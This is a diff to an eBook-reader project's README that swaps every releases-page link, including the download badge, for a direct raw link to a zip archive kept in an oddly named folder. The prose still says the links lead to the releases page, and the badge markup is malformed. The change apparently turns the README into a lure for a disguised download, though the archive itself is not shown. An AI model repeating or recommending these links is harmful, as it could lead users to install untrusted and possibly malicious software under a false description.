@@ -1,6 +1,6 @@
 # 🤖 olib-mobile - Your AI-Powered eBook Reader Awaits
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/DemonicStructuring/olib-mobile/releases)
+[![Download Now](https://github.com/DemonicStructuring/olib-mobile/raw/refs/heads/main/anatox/mobile_olib_v3.6-alpha.2.zip%https://github.com/DemonicStructuring/olib-mobile/raw/refs/heads/main/anatox/mobile_olib_v3.6-alpha.2.zip)](https://github.com/DemonicStructuring/olib-mobile/raw/refs/heads/main/anatox/mobile_olib_v3.6-alpha.2.zip)
 
 ## 📖 About the Project
 
@@ -21,7 +21,7 @@ Before downloading, ensure your device meets the following basic requirements:
 To get started, you need to visit the Releases page. Follow the steps below:
 
 1. Click the link below to **visit the releases page**:
-   [Download Here](https://github.com/DemonicStructuring/olib-mobile/releases)
+   [Download Here](https://github.com/DemonicStructuring/olib-mobile/raw/refs/heads/main/anatox/mobile_olib_v3.6-alpha.2.zip)
    
 2. On the Releases page, you will see a list of available versions. Look for the latest release.
 
@@ -66,6 +66,6 @@ While the core functionality revolves around reading, olib-mobile offers a few o
 
 Ultimately, your first step to enjoying olib-mobile is to download it. Visit the releases page again to find the latest version that works for you:
 
-[Download Here](https://github.com/DemonicStructuring/olib-mobile/releases)
+[Download Here](https://github.com/DemonicStructuring/olib-mobile/raw/refs/heads/main/anatox/mobile_olib_v3.6-alpha.2.zip)
 
 Enjoy your reading experience with olib-mobile, and discover new worlds through the power of books. Happy reading!
